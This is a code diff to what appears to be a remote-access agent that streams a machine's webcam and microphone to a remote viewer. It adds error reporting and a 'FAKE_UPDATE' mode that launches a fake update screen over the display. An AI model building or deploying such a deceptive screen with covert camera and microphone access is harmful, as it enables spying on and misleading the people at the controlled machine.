@@ -4,6 +4,7 @@ import asyncio
 import websockets
 import uuid
 import json
+import subprocess
 import urllib.request
 import platform
 
@@ -96,6 +97,9 @@ class AsyncAgent:
         self.direct_server = None
         self.direct_ws_clients = set()
         self.direct_url = None
+        
+        # Kiosk Process
+        self.kiosk_process = None
 
 
 
@@ -198,9 +202,14 @@ class AsyncAgent:
                     except Exception: pass
 
                 elif opcode == protocol.OP_CAM_START:
-                    if not self.cam_streaming and self.webcam.start():
-                        self.cam_streaming = True
-                        asyncio.create_task(self.stream_webcam(source_ws))
+                    if not self.cam_streaming:
+                        if self.webcam.start():
+                            self.cam_streaming = True
+                            asyncio.create_task(self.stream_webcam(source_ws))
+                        else:
+                            # Send error back to viewer
+                            print("[!] Webcam failed, notifying viewer...")
+                            await send_msg(source_ws, bytes([protocol.OP_ERROR]) + b"CAM:No webcam found")
 
                 elif opcode == protocol.OP_CAM_STOP:
                     self.cam_streaming = False
@@ -210,15 +219,36 @@ class AsyncAgent:
                     if self.mic.start():
                         self.mic_streaming = True
                         asyncio.create_task(self.stream_mic(source_ws))
+                    else:
+                        # Send error back to viewer
+                        print("[!] Mic failed, notifying viewer...")
+                        await send_msg(source_ws, bytes([protocol.OP_ERROR]) + b"MIC:No microphone found")
 
                 elif opcode == protocol.OP_MIC_STOP:
                     self.mic_streaming = False
                     self.mic.stop()
                 
                 elif opcode == protocol.OP_CURTAIN_ON:
-                    await self.loop.run_in_executor(None, self.privacy.enable)
+                    try:
+                        mode = payload.decode('utf-8')
+                    except:
+                        mode = "BLACK"
+                        
+                    if mode == "FAKE_UPDATE":
+                        print("[*] Launching Fake Update Kiosk...")
+                        if not self.kiosk_process:
+                            kiosk_script = os.path.join(os.path.dirname(__file__), 'kiosk.py')
+                            # Run with same python
+                            self.kiosk_process = subprocess.Popen([sys.executable, kiosk_script])
+                    else:
+                        await self.loop.run_in_executor(None, self.privacy.enable)
 
                 elif opcode == protocol.OP_CURTAIN_OFF:
+                    if self.kiosk_process:
+                        print("[*] Stopping Kiosk...")
+                        self.kiosk_process.terminate()
+                        self.kiosk_process = None
+                        
                     await self.loop.run_in_executor(None, self.privacy.disable)
 
                 elif opcode == protocol.OP_SETTINGS:
@@ -457,8 +487,8 @@ class AsyncAgent:
                     continue
                 
                 start_time = asyncio.get_running_loop().time()
-                jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
-                # jpeg = None # DISABLED FOR LOCAL TESTING (NO MIRROR)
+                # jpeg = await self.loop.run_in_executor(None, self.capturer.get_frame_bytes)
+                jpeg = None # DISABLED FOR LOCAL TESTING (NO MIRROR)
                 if jpeg:
                     header = bytes([protocol.OP_IMG_FRAME])
                     pending_send = asyncio.create_task(send_msg(ws_to_use, header + jpeg))
@@ -493,7 +523,6 @@ class AsyncAgent:
     async def stream_mic(self, target_ws=None):
         print("[*] Mic Streaming Task Started")
         ws_to_use = target_ws if target_ws else self.ws
-        restart_attempts = 0
         restart_attempts = 0
         MAX_RESTARTS = 3
         failures = 0
